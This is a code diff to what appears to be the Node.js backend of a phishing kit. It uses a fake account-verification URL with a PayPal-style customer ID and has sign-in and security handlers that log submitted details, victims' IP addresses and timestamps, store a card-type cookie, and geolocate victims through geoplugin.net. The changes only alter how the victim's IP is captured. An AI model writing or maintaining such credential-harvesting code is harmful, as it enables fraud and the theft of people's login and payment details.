@@ -10,6 +10,8 @@ var cookieParser = require('cookie-parser');
 app.use(cookieParser());
 app.use(express.static('public'));
 
+var get_ip = require('ipware')().get_ip;
+
 var main_url = '/Verification/update-account/customer_center/customer-IDPP00C984/myaccount';
 
 
@@ -93,7 +95,7 @@ app.post(main_url+'/signin/settings',function (req,res) {
     }
 
 
-    txt += '<br>ip :'+req.connection.remoteAddress;
+    txt += '<br>ip :'+get_ip(req).clientIp;
 
     txt += '<br>Time: ' + (new Date).toUTCString();
     txt = `<p>${txt}</p><hr>`;
@@ -101,7 +103,7 @@ app.post(main_url+'/signin/settings',function (req,res) {
     var type = req.body.c_type;
     res.cookie('c_card', type, { maxAge: 900000});
 
-    get_ip(req.connection.remoteAddress.replace(/[a-zA-Z]/gi,'').trim(),function (cc) {
+    get_coun(get_ip(req).clientIp,function (cc) {
         res.cookie('local', cc, { maxAge: 900000});
         res.end('<script>location = "'+ main_url +'/security?'+ options +'" </script>');
 
@@ -152,7 +154,7 @@ app.post(main_url +'/security',function (req,res) {
     }
 
 
-    txt += '<br>ip : '+ req.connection.remoteAddress;
+    txt += '<br>ip : '+ get_ip(req).clientIp;
     txt += '<br>Time :' + (new Date).toUTCString();
 
     txt = `<p>${txt}</p><hr>`;
@@ -214,7 +216,7 @@ function save(path,txt) {
    // console.log(txt);
 }
 
-function get_ip(ip,fun) {
+function get_coun(ip,fun) {
     var req = require('request');
     req.get('http://www.geoplugin.net/json.gp?ip='+ip,function (error,data,s) {
 
